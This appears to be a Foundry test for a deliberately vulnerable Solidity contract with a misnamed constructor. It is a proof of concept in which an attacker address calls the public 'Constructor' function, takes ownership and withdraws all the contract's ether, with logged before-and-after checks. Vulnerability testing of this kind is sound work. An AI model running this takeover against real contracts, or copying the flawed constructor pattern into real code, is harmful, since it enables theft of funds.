// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/incorrect_constructor_name3.sol";

contract MissingTest is Test {
    Missing public missingContract;
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Fund deployer and attacker addresses
        vm.deal(deployer, 10 ether);
        vm.deal(attacker, 10 ether);

        // Deploy contract from deployer address
        vm.prank(deployer);
        missingContract = new Missing();
    }

    function test_ConstructorAccessControl() public {
        // Deployer sets themselves as owner
        vm.prank(deployer);
        missingContract.Constructor();

        // Send 1 ETH to contract from attacker
        vm.prank(attacker);
        (bool sent, ) = address(missingContract).call{value: 1 ether}("");
        require(sent, "Failed to send Ether");

        // DIFFERENTIAL VALIDATION: PART 1 (Pre-trigger check)
        console.log("--- BEFORE-Trigger: Check if attacker can withdraw ---");
        uint256 snapshot1 = vm.snapshot(); // Create pre-trigger state snapshot
        bool canWithdrawBefore;
        vm.prank(attacker);
        try missingContract.withdraw() {
            canWithdrawBefore = true;
        } catch {
            canWithdrawBefore = false;
        }
        vm.revertTo(snapshot1); // Revert to pre-trigger state
        console.log("Attacker withdrawal possible [before]:", 
                   canWithdrawBefore ? "YES" : "NO");
        
        // TRIGGER ACTION: Attacker attempts to become owner
        console.log("--- Trigger: Attacker calls Constructor ---");
        vm.prank(attacker);
        missingContract.Constructor();

        // DIFFERENTIAL VALIDATION: PART 2 (Post-trigger check)
        console.log("--- AFTER-Trigger: Check if attacker can withdraw ---");
        uint256 snapshot2 = vm.snapshot(); // Create post-trigger state snapshot
        bool canWithdrawAfter;
        vm.prank(attacker);
        try missingContract.withdraw() {
            canWithdrawAfter = true;
        } catch {
            canWithdrawAfter = false;
        }
        vm.revertTo(snapshot2); // Revert to post-trigger state
        console.log("Attacker withdrawal possible [after]:", 
                   canWithdrawAfter ? "YES" : "NO");

        // Compare results for differential validation
        bool vulnerabilityExists = (canWithdrawAfter && !canWithdrawBefore);
        console.log("Ownership transfer detected:", 
                   vulnerabilityExists ? "YES" : "NO");
        
        // CONTINUE ORIGINAL VERIFICATION
        // Record balances before withdrawal
        uint256 contractBalanceBefore = address(missingContract).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;

        // Set gas price to 0 to ignore gas costs
        vm.txGasPrice(0);
        
        // Attacker withdraws contract funds
        vm.prank(attacker);
        missingContract.withdraw();

        // Verify funds were stolen
        assertEq(
            address(missingContract).balance, 
            0, 
            "Contract balance should be 0"
        );
        assertEq(
            address(attacker).balance,
            attackerBalanceBefore + contractBalanceBefore,
            "Attacker should receive contract balance"
        );
        
        // FINAL VULNERABILITY VERDICT
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Attacker successfully bypassed access control");
        } else {
            console.log("Vulnerability not Exist: Constructor access control works properly");
        }
    }
}